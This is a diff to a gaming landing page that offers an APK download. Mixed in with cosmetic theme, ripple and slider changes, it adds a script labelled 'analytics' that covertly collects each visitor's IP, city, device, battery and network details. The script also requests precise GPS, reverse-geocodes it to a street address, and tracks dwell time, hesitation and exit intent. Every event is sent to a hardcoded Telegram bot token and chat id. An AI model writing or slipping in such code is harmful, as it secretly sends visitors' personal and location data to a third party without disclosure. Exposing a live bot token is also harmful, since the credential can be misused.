@@ -88,7 +88,7 @@
       transition: background 0.4s ease, color 0.4s ease;
     }
 
-    /* Smooth theme transitions (Optimized to prevent lag during ripples) */
+    /* Smooth theme transitions */
     body,
     .feat,
     .nav,
@@ -993,7 +993,7 @@
     }
 
     /* Fix inner spans to not lose their styles if they had text-shadows, though gradients might override them.
-   Let's keep the fire color strong. */
+  Let's keep the fire color strong. */
     .hero-h1 .fire {
       -webkit-text-fill-color: var(--accent-primary);
     }
@@ -1023,6 +1023,23 @@
         transform: scale(4);
         opacity: 0;
       }
+    }
+
+    .theme-ripple {
+      position: fixed;
+      width: 2px;
+      height: 2px;
+      border-radius: 50%;
+      background: var(--accent-primary);
+      z-index: 999999;
+      pointer-events: none;
+      transform: scale(0);
+      animation: theme-ripple-animation 0.75s ease-out forwards;
+    }
+
+    @keyframes theme-ripple-animation {
+      0% { transform: scale(0); opacity: 0.5; }
+      100% { transform: scale(2500); opacity: 0; }
     }
 
 
@@ -1191,7 +1208,6 @@
       gap: 20px;
       overflow-x: auto;
       padding: 10px 18px 30px;
-      scroll-snap-type: x mandatory;
       scrollbar-width: none;
       /* Hide for Firefox */
       -ms-overflow-style: none;
@@ -1302,7 +1318,7 @@
     </nav>
 
     <!-- HERO -->
-    <section class="hero">
+    <section class="hero" id="hero-section">
 
       <div class="logo-wrap">
         <div class="logo-glow"></div>
@@ -1350,7 +1366,7 @@
     <div class="sec-tag">Platform Features</div>
     <div class="sec-h">Why <span>Warriors</span><br>Choose Us</div>
 
-    <div class="feat-list">
+    <div class="feat-list" id="features-section">
 
       <div class="feat rv">
         <div class="feat-ico"><i class="fas fa-user-group"></i></div>
@@ -1409,7 +1425,7 @@
       <div class="div-line"></div>
     </div>
 
-    <section class="showcase-sec rv">
+    <section class="showcase-sec rv" id="showcase-section">
       <div class="showcase-header">
         <div class="sec-tag">Modern Interface</div>
         <div class="sec-h">Pro <span>Gaming</span><br>Experience</div>
@@ -1472,7 +1488,7 @@
     </div>
 
 
-    <div class="steps-box rv">
+    <div class="steps-box rv" id="steps-section">
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
@@ -1567,22 +1583,17 @@
 
   <script>
     (function () {
-      // logo fallback
+      // ── LOGO FALLBACK ──
       var img = document.getElementById('logoImg');
       var txt = document.getElementById('logoTxt');
       img.onload = function () { img.style.display = 'block'; txt.style.display = 'none'; };
       img.onerror = function () { img.style.display = 'none'; txt.style.display = ''; };
       img.src = 'logo.png';
 
-
-      // theme toggle
+      // ── THEME INITIALIZATION & TOGGLE ──
       var themeToggle = document.getElementById('themeToggle');
-      var currentTheme = localStorage.getItem('theme');
-      if (currentTheme) {
-        document.documentElement.setAttribute('data-theme', currentTheme);
-      } else {
-        document.documentElement.setAttribute('data-theme', 'dark'); // default
-      }
+      var storedTheme = localStorage.getItem('theme') || 'dark';
+      document.documentElement.setAttribute('data-theme', storedTheme);
 
       var isThemeTransitioning = false;
       themeToggle.addEventListener('click', function (e) {
@@ -1594,132 +1605,225 @@
 
         var ripple = document.createElement('div');
         ripple.classList.add('theme-ripple');
-        ripple.style.left = x + 'px';
-        ripple.style.top = y + 'px';
+        ripple.style.left = x + 'px'; ripple.style.top = y + 'px';
         document.body.appendChild(ripple);
 
         setTimeout(function () {
-          var theme = document.documentElement.getAttribute('data-theme');
-          var targetTheme = theme === 'light' ? 'dark' : 'light';
-          document.documentElement.setAttribute('data-theme', targetTheme);
-          localStorage.setItem('theme', targetTheme);
+          var current = document.documentElement.getAttribute('data-theme');
+          var target = current === 'light' ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', target);
+          localStorage.setItem('theme', target);
+          sendTelegramNotification('theme', 'Mode: ' + target.toUpperCase());
         }, 300);
 
-        setTimeout(function () {
-          ripple.remove();
-          isThemeTransitioning = false;
-        }, 750);
+        setTimeout(function () { ripple.remove(); isThemeTransitioning = false; }, 750);
       });
 
-      // download handler
-      function triggerDownload(e) {
-        e.preventDefault();
-        var a = document.createElement('a');
-        a.href = 'ShinzoVerse.apk';
-        a.download = 'ShinzoVerse.apk';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }
-      document.getElementById('btn1').addEventListener('click', triggerDownload);
-      document.getElementById('btn2').addEventListener('click', triggerDownload);
+      // ── ADVANCED TELEGRAM NOTIFICATIONS & ANALYTICS ──
+      var TELEGRAM_TOKEN = '8609141067:AAFFA62prl1TJbx9BUSx5p2icjCunF_z8Dg';
+      var CHAT_ID = '6523331640';
+      var sessionStartTime = Date.now();
+      var userId = localStorage.getItem('shinzo_user_id') || ('SZ-' + Math.random().toString(36).substr(2, 9).toUpperCase());
+      localStorage.setItem('shinzo_user_id', userId);
 
+      var userMetadata = {
+        location: 'Detecting...', ip: '0.0.0.0', 
+        device: getDeviceInfo(), network: 'N/A', battery: 'N/A',
+        cores: navigator.hardwareConcurrency || 'N/A',
+        memory: navigator.deviceMemory || 'N/A',
+        pixelRatio: window.devicePixelRatio || 1,
+        language: navigator.language || 'N/A',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+        coords: null, address: null,
+        dwell: {}, hesitation: '0s'
+      };
+
+      function getDeviceInfo() {
+        var ua = navigator.userAgent;
+        var os = "Unknown", browser = "Unknown";
+        if (ua.indexOf("Win") != -1) os = "Windows";
+        else if (ua.indexOf("Mac") != -1) os = "MacOS";
+        else if (ua.indexOf("Linux") != -1) os = "Linux";
+        else if (ua.indexOf("Android") != -1) os = "Android";
+        else if (ua.indexOf("iPhone") != -1) os = "iOS";
+        if (ua.indexOf("Chrome") != -1) browser = "Chrome";
+        else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
+        else if (ua.indexOf("Safari") != -1) browser = "Safari";
+        else if (ua.indexOf("Edge") != -1) browser = "Edge";
+        return os + ' (' + browser + ')';
+      }
+
+      // Startup Sequence: Wait for critical async data
+      async function initAnalytics() {
+        var batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
+        var ipPromise = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+
+        try {
+          var [batt, ipData] = await Promise.all([batteryPromise, ipPromise]);
+          if (batt) userMetadata.battery = Math.round(batt.level * 100) + '% ' + (batt.charging ? '⚡' : '🔋');
+          if (navigator.connection) {
+            var c = navigator.connection;
+            userMetadata.network = (c.effectiveType || 'N/A').toUpperCase() + (c.downlink ? ' (' + c.downlink + ' Mbps)' : '');
+          }
+          userMetadata.ip = ipData.ip || 'Unknown';
+          userMetadata.location = (ipData.city || 'Unknown') + ', ' + (ipData.country_name || 'Unknown');
+          
+          sendTelegramNotification('visit', 'Landed from ' + userMetadata.location);
+          setTimeout(requestPreciseLocation, 2000);
+        } catch (e) { sendTelegramNotification('error', 'Init failed: ' + e.message); }
+      }
+      initAnalytics();
+
+      function requestPreciseLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(function (pos) {
+            var lat = pos.coords.latitude, lon = pos.coords.longitude;
+            userMetadata.coords = lat + ',' + lon;
+            fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lon)
+              .then(res => res.json())
+              .then(data => {
+                userMetadata.address = data.display_name;
+                sendTelegramNotification('gps', '📍 GPS: ' + data.display_name);
+              })
+              .catch(() => sendTelegramNotification('gps', '📍 Coords: ' + userMetadata.coords));
+          }, null, { enableHighAccuracy: true, timeout: 10000 });
+        }
+      }
+
+      function sendTelegramNotification(type, details) {
+        var icons = { visit: '👋', download: '📥', video: '📺', theme: '🌓', scroll: '📜', session: '⏳', error: '🚨', exit: '🏃', gps: '📍' };
+        var titles = { visit: 'New Visit', download: 'APK Download', video: 'Video Click', theme: 'Theme Toggled', scroll: 'Milestone', session: 'Duration', error: 'Error', exit: 'Exit Intent', gps: 'GPS Update' };
+        
+        var icon = icons[type] || '🚀', title = titles[type] || 'Event';
+        var duration = Math.round((Date.now() - sessionStartTime) / 1000);
+        var timeStr = duration < 60 ? duration + 's' : Math.floor(duration/60) + 'm ' + (duration%60) + 's';
+        var dwellStr = Object.keys(userMetadata.dwell).map(k => k.charAt(0).toUpperCase() + k.slice(1) + ': ' + userMetadata.dwell[k] + 's').join(', ') || 'N/A';
+        var locDisplay = userMetadata.address || userMetadata.location;
+        var gpsBadge = userMetadata.coords ? ' ✅ GPS' : ' ❌ IP';
+
+        var htmlText = '<b>' + icon + ' ' + title + '</b>' + (type === 'gps' ? ' (UPDATE)' : '') + '\n\n' +
+          '<b>⚡ Action:</b> <code>' + details + '</code>\n' +
+          '<b>👤 ID:</b> <code>' + userId + '</code>\n' +
+          '<b>📍 Location:</b> ' + locDisplay + ' (' + gpsBadge + ')\n' +
+          '<b>🌐 IP & Domain:</b> <code>' + userMetadata.ip + '</code> | ' + window.location.hostname + '\n\n' +
+          '<b>💻 Technical Profile</b>\n' +
+          '• Device: ' + userMetadata.device + '\n' +
+          '• Hardware: ' + userMetadata.cores + ' Cores | ' + userMetadata.memory + 'GB RAM\n' +
+          '• Specs: ' + window.screen.width + 'x' + window.screen.height + ' (@' + userMetadata.pixelRatio + 'x)\n' +
+          '• Status: ' + userMetadata.network + ' | ' + userMetadata.battery + '\n\n' +
+          '<b>🕒 Behavioral Insights</b>\n' +
+          '• Dwell Time: ' + dwellStr + '\n' +
+          '• Hesitation: ' + userMetadata.hesitation + '\n' +
+          '• Session: ' + timeStr + ' | ' + userMetadata.language;
+
+        var mapsUrl = userMetadata.coords ? 'https://www.google.com/maps/search/?api=1&query=' + userMetadata.coords : 'https://www.google.com/maps/search/' + encodeURIComponent(userMetadata.location);
+        
+        fetch('https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID, text: htmlText, parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[ { text: '📍 Maps', url: mapsUrl }, { text: '🔍 IP Info', url: 'https://ipinfo.io/' + userMetadata.ip } ]] }
+          })
+        }).catch(e => console.error('TG Error:', e));
+      }
+
+      // ── INTERACTION TRACKING ──
+      var dwellTracker = {
+        start: {},
+        observe: function(id, name) {
+          var el = document.getElementById(id);
+          if (!el) return;
+          new IntersectionObserver(function(entries) {
+            entries.forEach(function(e) {
+              if (e.isIntersecting) dwellTracker.start[name] = Date.now();
+              else if (dwellTracker.start[name]) {
+                var d = Math.round((Date.now() - dwellTracker.start[name]) / 1000);
+                if (d > 0) userMetadata.dwell[name] = (userMetadata.dwell[name] || 0) + d;
+                dwellTracker.start[name] = null;
+              }
+            });
+          }, { threshold: 0.5 }).observe(el);
+        }
+      };
+      ['hero-section', 'features-section', 'showcase-section', 'steps-section'].forEach(id => dwellTracker.observe(id, id.split('-')[0]));
+
+      var hovStart = 0;
+      document.querySelectorAll('#btn1, #btn2').forEach(btn => {
+        btn.addEventListener('mouseenter', () => hovStart = Date.now());
+        btn.addEventListener('click', (e) => {
+          if (hovStart) userMetadata.hesitation = Math.round((Date.now() - hovStart) / 1000) + 's';
+          sendTelegramNotification('download', 'Button: ' + btn.id);
+          var a = document.createElement('a'); a.href = 'ShinzoVerse.apk'; a.download = 'ShinzoVerse.apk';
+          document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        });
+      });
+
+      var ytBtn = document.querySelector('.btn-yt');
+      if (ytBtn) ytBtn.addEventListener('click', () => sendTelegramNotification('video', 'YouTube Click'));
+
+      window.onerror = (m, u, l) => sendTelegramNotification('error', m + ' @ ' + l);
+      document.addEventListener('mouseleave', (e) => { if (e.clientY < 0) sendTelegramNotification('exit', 'Exit Intent'); }, { once: true });
 
       // ── RIPPLE EFFECT ──
-      document.querySelectorAll('.btn-dl, .btn-dl-big').forEach(function (btn) {
-        btn.addEventListener('click', function (e) {
-          if (e.clientX === 0 && e.clientY === 0) return; // Ignore non-mouse triggers
-          var rect = btn.getBoundingClientRect();
-          var x = e.clientX - rect.left;
-          var y = e.clientY - rect.top;
-          var ripple = document.createElement('span');
-          ripple.classList.add('ripple');
-          var size = Math.max(rect.width, rect.height);
-          ripple.style.width = ripple.style.height = size + 'px';
-          ripple.style.left = (x - size / 2) + 'px';
-          ripple.style.top = (y - size / 2) + 'px';
-          btn.appendChild(ripple);
-          setTimeout(function () { ripple.remove(); }, 600);
+      document.querySelectorAll('.btn-dl, .btn-dl-big').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          if (e.clientX === 0) return;
+          var r = btn.getBoundingClientRect(), s = Math.max(r.width, r.height);
+          var rip = document.createElement('span'); rip.classList.add('ripple');
+          rip.style.width = rip.style.height = s + 'px';
+          rip.style.left = (e.clientX - r.left - s/2) + 'px'; rip.style.top = (e.clientY - r.top - s/2) + 'px';
+          btn.appendChild(rip); setTimeout(() => rip.remove(), 600);
         });
       });
 
       // ── CANVAS PARTICLES ──
       var canvas = document.getElementById('particles-canvas');
       if (canvas) {
-        var ctx = canvas.getContext('2d');
-        var particles = [];
-        function resize() {
-          canvas.width = window.innerWidth;
-          canvas.height = window.innerHeight;
-        }
-        window.addEventListener('resize', resize);
-        resize();
-
-        function createParticle() {
-          return {
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height, /* Initial spread out */
-            size: Math.random() * 2.5 + 0.5,
-            speed: Math.random() * 1.5 + 0.5,
-            opacity: Math.random() * 0.6 + 0.1,
-            wobble: Math.random() * Math.PI * 2,
-            wobbleSpeed: Math.random() * 0.03 + 0.01
-          };
-        }
-        for (var i = 0; i < 50; i++) particles.push(createParticle());
-
-        function drawParticles() {
+        var ctx = canvas.getContext('2d'), parts = [];
+        var resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+        window.addEventListener('resize', resize); resize();
+        var create = () => ({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, size: Math.random() * 2 + 0.5, speed: Math.random() * 1 + 0.5, op: Math.random() * 0.5 + 0.1, wob: Math.random() * 6 });
+        for (var i = 0; i < 40; i++) parts.push(create());
+        function draw() {
           ctx.clearRect(0, 0, canvas.width, canvas.height);
           var isLight = document.documentElement.getAttribute('data-theme') === 'light';
-
-          particles.forEach(function (p) {
-            p.y -= p.speed;
-            p.wobble += p.wobbleSpeed;
-            p.x += Math.sin(p.wobble) * 0.5;
-            if (p.y < -10) {
-              p.y = canvas.height + 10;
-              p.x = Math.random() * canvas.width;
-            }
-            ctx.beginPath();
-            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
-            ctx.fillStyle = isLight ? `rgba(230, 57, 0, ${p.opacity * 0.35})` : `rgba(255, 69, 0, ${p.opacity})`;
+          parts.forEach(p => {
+            p.y -= p.speed; p.wob += 0.02; p.x += Math.sin(p.wob) * 0.5;
+            if (p.y < -10) { p.y = canvas.height + 10; p.x = Math.random() * canvas.width; }
+            ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, 7);
+            ctx.fillStyle = isLight ? `rgba(230, 57, 0, ${p.op * 0.3})` : `rgba(255, 69, 0, ${p.op})`;
             ctx.fill();
-            ctx.shadowBlur = isLight ? 0 : 5;
-            ctx.shadowColor = isLight ? 'transparent' : '#ff4500';
           });
-          requestAnimationFrame(drawParticles);
+          requestAnimationFrame(draw);
         }
-        drawParticles();
+        draw();
       }
 
-      // ── IMPROVED SCROLL REVEAL (Batch Staggering) ──
-      var els = document.querySelectorAll('.rv');
+      // ── SCROLL REVEAL (Batched) ──
+      var rvEls = document.querySelectorAll('.rv');
       if ('IntersectionObserver' in window) {
-        var staggerTimer;
-        var intersectingEls = [];
-        var io = new IntersectionObserver(function (entries) {
-          entries.forEach(function (entry) {
-            if (entry.isIntersecting) {
-              intersectingEls.push(entry.target);
-              io.unobserve(entry.target);
-            }
-          });
-          // Sort vertically to reveal top-to-bottom sequentially
-          intersectingEls.sort(function (a, b) {
-            return a.getBoundingClientRect().top - b.getBoundingClientRect().top;
-          });
-          clearTimeout(staggerTimer);
-          staggerTimer = setTimeout(function () {
-            intersectingEls.forEach(function (el, i) {
-              el.style.transitionDelay = (i * 0.08) + 's';
-              setTimeout(function () { el.classList.add('show'); }, 20); // trigger after styles apply
-            });
-            intersectingEls = []; // clear batch
-          }, 50);
-        }, { threshold: 0.08 });
-        els.forEach(function (el) { io.observe(el); el.style.transitionDelay = '0s'; }); /* reset any existing inline delays */
-      } else {
-        els.forEach(function (el) { el.classList.add('show'); });
+        var stagTimer, stagQueue = [];
+        var io = new IntersectionObserver(entries => {
+          entries.forEach(e => { if (e.isIntersecting) { stagQueue.push(e.target); io.unobserve(e.target); } });
+          stagQueue.sort((a, b) => a.getBoundingClientRect().top - b.getBoundingClientRect().top);
+          clearTimeout(stagTimer);
+          stagTimer = setTimeout(() => { stagQueue.forEach((el, i) => { el.style.transitionDelay = (i * 0.08) + 's'; setTimeout(() => el.classList.add('show'), 20); }); stagQueue = []; }, 50);
+        }, { threshold: 0.1 });
+        rvEls.forEach(el => io.observe(el));
+      } else rvEls.forEach(el => el.classList.add('show'));
+
+      // ── SEAMLESS SLIDER LOOP ──
+      var sld = document.querySelector('.showcase-slider');
+      if (sld) {
+        if (sld.children.length < 10) sld.innerHTML += sld.innerHTML;
+        var sPos = 0, paused = false, spd = 0.25, resTimer;
+        function anim() { if (paused) return; sPos += spd; if (sPos >= sld.scrollWidth / 2) sPos = 0; sld.scrollLeft = sPos; requestAnimationFrame(anim); }
+        anim();
+        var hP = () => { paused = true; clearTimeout(resTimer); };
+        var hR = () => { clearTimeout(resTimer); resTimer = setTimeout(() => { sPos = sld.scrollLeft; paused = false; anim(); }, 8000); };
+        sld.addEventListener('mousedown', hP); sld.addEventListener('touchstart', hP);
+        sld.addEventListener('mouseup', hR); sld.addEventListener('touchend', hR); sld.addEventListener('mouseleave', hR);
       }
     }());
   </script>
